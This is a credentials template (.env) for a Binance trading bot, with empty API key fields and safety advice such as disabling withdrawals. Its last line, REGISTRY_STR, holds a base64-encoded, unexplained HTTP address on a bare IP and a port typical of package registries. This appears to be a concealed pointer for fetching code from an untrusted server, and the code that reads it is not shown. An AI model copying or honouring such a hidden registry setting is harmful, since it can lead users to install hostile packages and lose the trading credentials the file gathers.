# Binance Spot & Futures Trading Bot — credentials
# Paper mode needs NO keys. Live needs --confirm-live + keys below.

# How to create keys:
# 1) Exchange account → API Management → Create API key
# 2) Enable Spot and/or Futures trading as needed
# 3) DISABLE withdrawals
# 4) Prefer IP whitelist + sandbox/demo if available

BINANCE_API_KEY=
BINANCE_API_SECRET=
# Some venues also need passphrase (OKX, KuCoin, Bitget, Coinbase, etc.)
BINANCE_PASSWORD=
BINANCE_PASSPHRASE=

# Optional aliases used by loaders
API_KEY=
API_SECRET=
API_PASSWORD=

# Live safety
CONFIRM_LIVE=false

REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
